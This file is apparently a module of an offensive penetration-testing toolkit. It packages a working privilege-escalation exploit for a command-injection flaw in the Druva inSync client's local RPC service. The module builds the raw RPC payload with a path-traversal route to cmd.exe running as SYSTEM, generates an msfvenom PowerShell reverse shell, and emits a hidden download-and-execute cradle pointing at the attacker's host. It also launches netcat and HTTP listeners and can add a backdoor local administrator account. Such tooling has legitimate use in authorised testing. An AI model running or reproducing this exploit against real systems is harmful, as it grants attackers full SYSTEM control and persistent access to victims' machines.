import shutil
import subprocess
from pathlib import Path

from core.target import load_current_profile
from core.attacker import resolve_lhost


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

DEFAULT_PORT = "6064"
DEFAULT_NEW_USER = "hacker"


# ==========================================
# HELPERS
# ==========================================

def _header():

    print(f"\n{B}┌── MODULE: SOFTWARE EXPLOITS — DRUVA INSYNC " + "─" * 15 + f"┐{W}")
    print(f"{B}│{W} TECHNIQUE: {C}{'inSyncCPH RPC command injection':<47}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt, default_yes=True, optional=False):

    #
    # Yellow [?] marks a genuinely skippable extra, not just any
    # default-to-no question — safety gates stay blue.
    #
    marker = Y if optional else B

    raw = input(f"\n{marker}[?]{W} {prompt}").strip().lower()

    if default_yes:
        return raw in ("", "y", "yes")

    return raw in ("y", "yes")


def copy_clipboard(text):

    try:

        import pyperclip

        pyperclip.copy(text)

        return True

    except Exception:

        return False


def _resolve_context():

    try:
        data, _ = load_current_profile()
    except Exception:
        data = {}

    ip = resolve_lhost(args=None, data=data)
    domain = data.get("domain")

    return ip, domain


def _start_listener(port):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'nc -lvnp {port}; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started a Netcat listener on port {port} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start listener: {e}{W}")
        print(f"{Y}[!] Start one yourself: nc -lvnp {port}{W}")


def _start_http_server(port):

    try:

        subprocess.Popen(
            ["x-terminal-emulator", "-e", f"bash -c 'python3 -m http.server {port}; exec bash'"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        print(f"{G}[+] Started a Python HTTP server on port {port} in a new terminal{W}")

    except Exception as e:

        print(f"{R}[-] Failed to start HTTP server: {e}{W}")
        print(f"{Y}[!] Start one yourself: python3 -m http.server {port}{W}")


def _generate_reverse_shell_script(lhost, lport, arch, out_path):

    #
    # Hosted and IEX'd on the target rather than embedded directly in the
    # RPC command — confirmed empirically that the command buffer this
    # exploit writes into is small: a ~140-char net-user command went
    # through fine, a ~1600-char embedded stager was silently dropped
    # (the sockets all report success either way — this RPC call has no
    # response, so a server-side truncation/reject never surfaces
    # client-side). A short download-cradle command comfortably fits
    # instead; the full payload's size is irrelevant once it's just a
    # file being served over HTTP.
    #
    # Architecture matters here in a way it didn't for the net-user path:
    # this payload VirtualAlloc's + CreateThreads raw shellcode inside
    # whatever powershell.exe IEX is running in. windows/powershell_reverse_tcp
    # with no arch defaults to x86 — run inside a native x64 process (which
    # is what spawns from a 64-bit service like inSyncCPHwnet64.exe), that
    # shellcode just crashes the hidden thread silently. No callback, no
    # visible error anywhere, even though the download itself succeeds.
    #
    payload = "windows/x64/powershell_reverse_tcp" if arch == "x64" else "windows/powershell_reverse_tcp"

    if not shutil.which("msfvenom"):

        print(f"\n{Y}[!] msfvenom not found on this box — generate it manually:{W}")
        _cmd(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f psh -o {out_path}")

        return False

    print(f"\n{B}[*] Generating a PowerShell reverse shell script with msfvenom...{W}")

    result = subprocess.run(
        [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", "psh",
            "-o", str(out_path),
        ],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0 or not out_path.is_file():

        print(f"{R}[-] msfvenom failed:{W}")
        print(result.stderr.strip())

        return False

    print(f"{G}[+] Generated {out_path}{W}")

    return True


def _build_download_cradle(lhost, web_port, filename):

    url = f"http://{lhost}:{web_port}/{filename}"

    return f"powershell -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\""


def _ps_double_quote_escape(text):
    #
    # The msfvenom one-liner is itself a double-quoted PowerShell command
    # (`powershell.exe ... "..."`), and net-user passwords are
    # operator-typed — either can carry a literal ", $, or backtick that
    # would otherwise break out of $cmd's own double-quoted assignment
    # below. Order matters: escape backticks first, or the backticks this
    # introduces for $ and " would themselves get re-escaped.
    #
    return text.replace("`", "``").replace("$", "`$").replace('"', '`"')


def _build_poc_command(cmd_value, port):

    #
    # This is the documented wire format for the flaw itself — a fixed
    # header, a hardcoded RPC type, a length-prefixed UTF-16 command —
    # not third-party tool logic worth staging as an external file the
    # way printnightmare's Invoke-Nightmare is. Collapsed onto one line
    # (PowerShell tolerates statement separators fine here) since a
    # single paste-able line survives a shaky reverse shell far better
    # than a multi-line block.
    #
    statements = [
        '$ErrorActionPreference = "Stop"',
        f'$cmd = "{_ps_double_quote_escape(cmd_value)}"',
        '$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)',
        f'$s.Connect("127.0.0.1", {port})',
        '$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")',
        '$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")',
        '$command = [System.Text.Encoding]::Unicode.GetBytes("C:\\ProgramData\\Druva\\inSync4\\..\\..\\..\\Windows\\System32\\cmd.exe /c $cmd")',
        '$length = [System.BitConverter]::GetBytes($command.Length)',
        '$s.Send($header)',
        '$s.Send($rpcType)',
        '$s.Send($length)',
        '$s.Send($command)',
    ]

    return "; ".join(statements)


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    ip, domain = _resolve_context()

    _header()

    _section("Confirm the service")

    port = input(f"\n{B}[?]{W} Druva RPC port [{C}{DEFAULT_PORT}{W}]: ").strip() or DEFAULT_PORT

    _step(
        1,
        "Confirm something is listening locally on the Druva RPC port",
        "No listener here means this technique doesn't apply.",
    )
    _cmd(f"netstat -ano | findstr {port}")

    _step(2, "Map the PID from netstat back to the process (optional sanity check)")
    _cmd("Get-Process -Id <PID>")

    _step(3, "Confirm the Druva inSync Client Service is running")
    _cmd("Get-Service | ? {$_.DisplayName -like 'Druva*'}")

    _section("Choose payload")

    #
    # Reverse shell is the default across these modules (printnightmare.py,
    # weakperms/service.py) — phrasing the question this way keeps a blank
    # Enter landing on reverse shell everywhere, consistently.
    #
    admin_add = _ask(
        "Add a local admin user instead of a reverse shell? [y/N]: ",
        default_yes=False,
        optional=True,
    )

    if admin_add:

        new_user = input(f"\n{B}[?]{W} New local admin username [{C}{DEFAULT_NEW_USER}{W}]: ").strip() or DEFAULT_NEW_USER

        #
        # Never let a bracketed placeholder become the literal value a
        # blank Enter silently accepts — this one has no safe default at all.
        #
        new_password = ""
        while not new_password:
            new_password = input(f"\n{B}[?]{W} Password for the new account (must meet complexity — required): ").strip()

        #
        # One RPC call = one command — & chains both regardless of the
        # first one's exit code, since net user's exit code isn't worth
        # gating the second command on here.
        #
        cmd_value = f"net user {new_user} {new_password} /add & net localgroup administrators {new_user} /add"

    else:

        lport = input(f"\n{B}[?]{W} Listener port [{C}4444{W}]: ").strip() or "4444"
        web_port = input(f"\n{B}[?]{W} HTTP hosting port for the payload script [{C}8080{W}]: ").strip() or "8080"

        print(f"\n{B}[*]{W} Not sure of the target's architecture? Run this on target first:")
        _cmd(
            "[System.Environment]::Is64BitOperatingSystem",
            "# True = x64, False = x86",
        )

        arch = input(f"\n{B}[?]{W} Payload architecture, x86 or x64 [{C}x64{W}]: ").strip() or "x64"

        script_name = "druva_shell.ps1"
        script_path = Path(script_name)

        if not _generate_reverse_shell_script(ip or "<ATTACKER-IP>", lport, arch, script_path):
            print(f"\n{R}[-] No payload script to host — aborting.{W}")
            return

        if _ask(f"Start a Python HTTP server on port {web_port} now (serving {script_name} from the current directory)? [Y/n]: "):
            _start_http_server(web_port)

        if _ask(f"Start a Netcat listener on port {lport} now? [Y/n]: "):
            _start_listener(lport)

        cmd_value = _build_download_cradle(ip or "<ATTACKER-IP>", web_port, script_name)

    _section("Execute on target")

    _step(
        4,
        "Run the exploit in your existing low-priv shell on the target",
        "Sends a crafted \"inSync PHC RPCW[v0002]\" request over the loopback RPC socket — the service runs the embedded command as NT AUTHORITY\\SYSTEM.",
    )
    poc_command = _build_poc_command(cmd_value, port)

    _cmd(poc_command)

    if copy_clipboard(poc_command):
        print(f"\n    {G}→ payload copied to clipboard{W}")

    if admin_add:

        _step(5, "Confirm the account landed in Administrators")
        _cmd(f"net user {new_user}")

        _step(6, "Get a fresh session to actually use the new admin membership")

        runas_user = f"{domain}\\{new_user}" if domain else new_user
        _cmd(f"runas /user:{runas_user} powershell.exe")

        print()
        print(f"    {B}[*]{W} Your old session's token is stale — it won't reflect the new group until relogon.")
        print()
        print(f"    {DIM}Account creation is noisy and easy to spot — confirm this is in scope before using it on an assessment.{W}")

    else:

        print()
        print(f"    {B}[*]{W} Catch the shell on your listener — it runs as NT AUTHORITY\\SYSTEM.")
        print(f"    {DIM}If nothing arrives, check your HTTP server's log for a hit on {script_name} first — that tells you whether the download cradle even fired before blaming the payload.{W}")
